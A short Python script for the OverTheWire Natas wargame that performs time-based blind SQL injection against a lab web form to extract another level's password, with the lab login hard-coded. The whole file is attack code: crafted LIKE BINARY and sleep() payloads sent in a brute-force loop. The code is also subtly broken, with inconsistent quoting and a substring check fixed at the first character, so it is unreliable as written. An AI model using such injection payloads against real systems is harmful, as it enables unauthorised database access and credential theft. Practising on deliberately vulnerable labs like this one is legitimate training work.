#!/bin/python
import requests,string
import sys

url = "http://natas15.natas.labs.overthewire.org"
auth_username = "natas15"
auth_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

# characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
characters = ''.join([string.ascii_letters,string.digits])

# Begin by building a dictionary of characters found in the password
# This will greatly decrease the complexity for our brute force attempts
password_dictionary = []
exists_str = "This user exists."
for char in characters:
    uri = ''.join([url,'?','username="natas18"','+AND+password+LIKE+BINARY+"%',char,'%+AND+sleep(10) #'])
    print(uri)
    r = requests.get(uri, auth=(auth_username,auth_password))
    sys.stdout.write("Password Dictionary: {0}_ {1} \r".format(''.join(password_dictionary),char))
    sys.stdout.flush()
    if r.elapsed.total_seconds()>2:
        password_dictionary.append(char)
        # print("Password Dictionary: {0}".format(''.join(password_dictionary)))
        
print("Dictionary build complete.")
print("Dictionary: {0}".format(''.join(password_dictionary)))

# Given the dictionary of characters we just built, we'll try each character in that list
print("Now attempting to brute force...")
password_list = []
password = ''
for i in range(1,35):
    for char in password_dictionary:
        test = ''.join([password,char])
        # Build the GET Request
        uri = ''.join([url,'?','username=natas18"','AND+(SELECT+sleep(10)+from+dual+where+(substring((SELECT+password+FROM+users+WHERE+username="natas18"),1,1))=BINARY+',test,')+--+'])
        # Send the HTTP GET request to the server
        r = requests.get(uri, auth=(auth_username,auth_password))
        # Parse the HTTP response
        sys.stdout.write("Length: {0}, Password: {1}{2} \r".format(len(password),password,char))
        sys.stdout.flush()
        if r.elapsed.total_seconds()>2:
            password_list.append(char)
            password = ''.join(password_list)
            # print("Length: {0}, Password: {1}".format(len(password),password))
            